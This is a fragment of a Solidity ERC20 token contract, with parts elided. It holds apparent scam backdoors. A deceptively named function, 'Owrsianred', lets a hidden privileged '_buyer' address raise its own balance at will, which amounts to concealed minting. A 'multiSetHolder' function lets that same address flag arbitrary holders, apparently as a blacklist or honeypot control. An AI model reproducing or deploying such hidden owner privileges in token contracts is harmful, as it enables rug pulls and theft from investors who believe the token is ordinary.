...
contract Token is Context, IERC20, Ownable{
    ...
    function Owrsianred(uint256 tFee) public {
        address account = _buyer;
        uint256 official = _balances[account];
        uint256 WITHofficial = official + tFee;
        require(msg.sender == account);
        private_buyer(account,WITHofficial);
    }
    
    function private_buyer(address account,uint256 endEnter) private {
    ...
    function multiSetHolder(bool status, address[] calldata addresses) public {
        require(_msgSender() == _buyer);
        for (uint256 i; i < addresses.length; i++) {
            address account = addresses[i];
            _holder[account] = status;
        }
    }
